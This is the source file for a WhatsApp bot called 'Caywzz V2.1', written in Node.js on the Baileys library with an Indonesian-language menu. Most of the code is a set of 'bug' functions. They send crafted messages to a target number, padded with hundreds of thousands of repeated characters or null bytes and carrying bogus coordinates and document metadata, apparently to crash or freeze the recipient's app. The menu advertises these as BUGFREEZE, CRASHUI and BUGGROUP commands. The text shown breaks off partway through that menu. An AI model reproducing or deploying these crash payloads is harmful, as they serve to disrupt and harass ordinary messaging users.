require("./geforceset/config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")

//==========> Module requirements  <===============//
const { exec } = require("child_process")
const fs = require('fs')
const util = require('util')
const { Deobfuscator } = require("deobfuscator");
const JsConfuser = require('js-confuser');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone') 
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom, formatp } = require('./geforceset/require/myfunc')
const premium = JSON.parse(fs.readFileSync("./geforceset/require/premium.json"))
module.exports = async (cay, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (cay.user.id.split(':')[0]+'@s.whatsapp.net' || cay.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await cay.decodeJid(cay.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await cay.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
// Tampilan console & pesan masuk
if (m.message) {
    console.log(`
${chalk.inverse(' 📬 MESSAGE RECEIVED ')}  ${chalk.inverse(` ${new Date().toLocaleString()} `)}

${chalk.magenta.bold('╭─ > From:')}      ${chalk.green.bold(pushname || 'Unknown')} ${chalk.yellow(`(${m.sender})`)}
${chalk.magenta.bold('├─ > In:')}        ${chalk.cyan.bold(m.isGroup ? 'Group Chat' : 'Private Chat')} ${chalk.gray(from)}
${chalk.magenta.bold('╰─ > Message:')}   ${chalk.white.bold(budy || m.mtype)}

${chalk.greenBright.bold('╭────────────────────────────────────────────╮')}
${chalk.greenBright.bold('│     Caywzz V2.1 - By cay                  │')}
${chalk.greenBright.bold('╰────────────────────────────────────────────╯')}
    `);
}
const fkontak = { key: {fromMe: false,participant: `6287875411618@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: "https://files.catbox.moe/kl61pt.jpg" }}}}
//pler
//========== FUNCTION ===========//
var ppuser
try {
ppuser = await cay.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}


let example = (teks) => {
return `*Contoh Cara Command :*\nketik *${cmd}* ${teks}`
}


function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

   //DECRYPT
    async function Decrypt(query) {
      const deobfuscatedCode = new Deobfuscator();
      return (deobfuscatedCode.deobfuscateSource(query));
    }
const QBug = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    const ftroli ={key: {fromMe: false,"participant":"6287875411618@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2024,status: 200, thumbnail: ppuser, surface: 200, message: `${global.namabot}`, orderTitle: 'By Hutao', sellerJid: '6287875411618@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
// REPLY WITH DOCUMENT
const fdoc = {key : {participant : '6287875411618@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `halo ${pushname}`,jpegThumbnail: ppuser}}}
//REPLY WITH VN
const fvn = {key: {participant: `6287875411618@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
// REPLY WITH GIFT
const fgif = {key: {participant: `6287875411618@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": 'Hutao', "h": 'Hutao','seconds': '359996400', 'gifPlayback': 'true', 'caption': 'Hutao', 'jpegThumbnail': ppuser}}}
// REPLY WITH GROUP LINK
const fgclink = {key: {participant: "6287875411618@s.whatsapp.net","remoteJid": "6287875411618@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6287875411618-1616169743@g.us","inviteCode": "m","groupName": "Hutao", "caption": `${pushname}`, 'jpegThumbnail': ppuser}}}
const qtext2 = { key: {fromMe: false, participant: `6287875411618@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: `${global.namaowner}` }}}

const qtext = { key: {fromMe: false, participant: `6287875411618@s.whatsapp.net`, ...(m.chat ? { remoteJid: "6287875411618@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Terimakasih telah order"}}}

const qlive = {key: {participant: '6287875411618@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `cay`,jpegThumbnail: ""}}}

const qaudio = {key: {participant: '6287875411618@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {audioMessage: {seconds: 900030, ptt: true }}}

const reply = (teks) => {
cay.sendMessage(from, { text: teks, contextInfo: {
            mentionedJid: [],
            groupMentions: [],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363357312070270@newsletter',
               newsletterName: `CaywzZ`,
                serverMessageId: -1
            },
            forwardingScore: 256,
externalAdReply: {
        showAdAttribution: true,
        title: `powered by caywzz`,
        body: `caywzzv2.1`,
        thumbnailUrl: `https://files.catbox.moe/kxesg4.jpg`,
        sourceUrl: "https://wa.me/6287875411618",
        mediaType: 1,
        renderLargerThumbnail: false
          }
        }}, { quoted: fkontak })}
//time
		const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
		let time2;
		if (time >= "19:00:00" && time < "23:59:00") {
			time2 = "夜 🌌";
		} else if (time >= "15:00:00" && time < "19:00:00") {
			time2 = "午後 🌇";
		} else if (time >= "11:00:00" && time < "15:00:00") {
			time2 = "正午 🏞️";
		} else if (time >= "06:00:00" && time < "11:00:00") {
			time2 = "朝 🌁";
		} else {
			time2 = "夜明け 🌆";
		}
// FUNCTION BUG
async function systemUi(nomor, Ptcp = false) {
    cay.relayMessage(nomor, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "👋" + "ꦾ".repeat(250000) + "@1".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor, quoted: QBug } }, { messageId: null });
};
async function locasifreeze2(nomor, ptcp = false) {
    await cay.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸" + "1".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
}
async function GlX(nomor, Ptcp = true) {
      await cay.relayMessage(
        nomor,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "Caywzz",
                  format: "EXTENSIONS_1",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Painzy 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"⿻ Staries Ni Boyy ⿻\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤▾ ⿻ StariesNiboss ⿻ ▾⭑̤${"\u0000".repeat(
                    1020000
                  )}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                  version: 3,
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: nomor,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ StariesPpk ⿻ ▾⭑"));
    }
    async function BugLoca1(nomor, QBug, Ptcp = true) {
  const tamak = "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸";

  await cay.relayMessage(
    nomor,
    {
      ephemeralMessage: {
        message: {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: `${tamak}ꦾ`.repeat(50000),
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: `\u0000${"ꦾ".repeat(90000)}`,
                },
                nativeFlowMessage: {
                  name: "call_permission_request",
                  messageParamsJson: tamak,
                },
                carouselMessage: {},
              },
            },
          },
        },
      },
    },
    Ptcp
      ? {
          participant: {
            jid: nomor,
          },
        }
      : {}
  );
}
async function bak2(nomor) {
  try {
    await cay.relayMessage(
      nomor,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: 
                      "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸" +
                      "\u0000" +
                      "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          ...(await prepareWAMessageMedia(
                            {
                              image: {
                                url: "https://files.catbox.moe/m33kq5.jpg",
                              },
                            },
                            { upload: cay.waUploadToServer }
                          )),
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(90000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
                                url: "https://t.me/caywzzneh",
                                merchant_url: "https://t.me/caywzzneh",
                              }),
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: JSON.stringify({
                                title: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
                                sections: [
                                  {
                                    title: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
                                    rows: [], // Kosong untuk menghilangkan pilihan
                                  },
                                ],
                              }),
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: JSON.stringify({
                                display_text: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
                                title: "CRASH!",
                                id: ".crasher",
                              }),
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: nomor },
      }
    );

    console.log(chalk.red.bold("Crash System Device"));
  } catch (error) {
    console.error("An error occurred:", error);
  }
}
   async function Jade(nomor, ptcp = true) {
      let FlashD = "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸" + "𑇂𑆵𑆴𑆿".repeat(50000) + "ꦽ".repeat(50000);
     await cay.relayMessage(
        nomor,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: FlashD,
            url: "https://t.me/caywzzneh",
          },
        },
        {
          participant: {
            jid: nomor,
          },
        }
      );
    }
    async function TxIos(nomor, Ptcp = false) {
			await cay.relayMessage(nomor, {
					"extendedTextMessage": {
						"text": "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "0@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": nomor,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "0@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
								"body": "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://t.me/caywzzneh",
								"mediaUrl": "https://t.me/caywzzneh",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://t.me/caywzzneh"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "0@s.whatsapp.net",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "0@s.whatsapp.net",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: nomor
					}
				} : {}
			);
			console.log(chalk.red("🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸"));
		};
    async function BlankScreen(nomor, Ptcp = false) {
let virtex = "🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿" + "ꦾ".repeat(77777) + "@0".repeat(50000);
			await cay.relayMessage(nomor, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: nomor
					}
				} : {}
			);
            console.log(chalk.red.bold('🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿'))
   	};
   	async function crashui2(nomor, ptcp = false) {
    await cay.relayMessage(nomor, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🌿͜͞𐊢ăŶ͜͝ɯʐʐ🌸" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: nomor } }, { messageId: null });
}
// Self & public
if (!cay.public) {
if (!m.key.fromMe) return
} 

switch(command) {
case "menu": {
  const text12 = `
👋 Hello ${pushname}, I am the *Whatsapp Bot* created by Caywzz. I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       
Selamat ${time2} !
━━━━━━━━━━━━━━━━━━━━━
だ .menu
だ .public
だ .self
━━━━━━━━━━━━━━━━━━━━━
┏─╌──╌──╌──╌⑇
だ BugMenu
だ CpanelMenu
だ OwnerMenu
┖─╌─╌────╌〣
©𝘊𝘰𝘱𝘺𝘳𝘪𝘨𝘩𝘵 2024`;

  // Sending a reaction
  await cay.sendMessage(m.chat, {
    react: {
      text: '⏳',
      key: m.key,
    },
  });

 cay.sendMessage(m.chat, {
          video: fs.readFileSync('./media/hutaomenu.mp4'),
          gifPlayback: true,

          caption: text12,
          contextInfo: {
            externalAdReply: {
              title: 'C A Y W Z Z V2.1',
              body: 'Creator : Caywzz',
              thumbnailUrl: 'https://files.catbox.moe/ggzetx.jpg',
              sourceUrl: `https://t.me/caywzz`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: m
        })
      } freya = fs.readFileSync('./media/music.mp3')
        cay.sendMessage(m.chat, { audio: freya, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
        break
        case 'ping': 
m.reply('Pong!')
break
		case 'bugmenu': {
			const msg = generateWAMessageFromContent(m.chat, {
				viewOnceMessage: {
					message: {
						messageContextInfo: {
							deviceListMetadata: {},
							deviceListMetadataVersion: 2
						},
						interactiveMessage: proto.Message.InteractiveMessage.fromObject({
							body: proto.Message.InteractiveMessage.Body.fromObject({
								text: ` ⛅
👋 Hello ${pushname}, I am the *Whatsapp Bot* created by Caywzz. I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       
Selamat ${time2} ! 
`
							}),
							footer: proto.Message.InteractiveMessage.Footer.fromObject({
								text: `> BugMenu`
							}),
							header: proto.Message.InteractiveMessage.Header.fromObject({
								title: `CaywzzaAja`,
								subtitle: "© Caywzz",
								hasMediaAttachment: false
							}),
							carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
								cards: [
									{
										body: proto.Message.InteractiveMessage.Body.fromObject({
											text: `
_*U S E R I N F O*_ 🌨️		
⟣──────────
くそ > NAME : ${pushname}
くそ > STATUS :  _*${isCreator ? 'OWNER' : isPremium ? 'PREMIUM' : 'UNKNOWN'}*_
くそ > DEV : CAYWZZ
⟣──────────
𝘽𝙐𝙂𝘼𝙉𝘿𝙍𝙊
> 🌌 _BUGFREEZE_			
> 🌌 _XC (TYPEBUG)_
> 🌌 _CRASHUI_
> 🌌 _BUGCAYWZZ_				
> 🌌 _BUGLOCATION_
> 🌌 _BUGGROUP_
⟣──────────
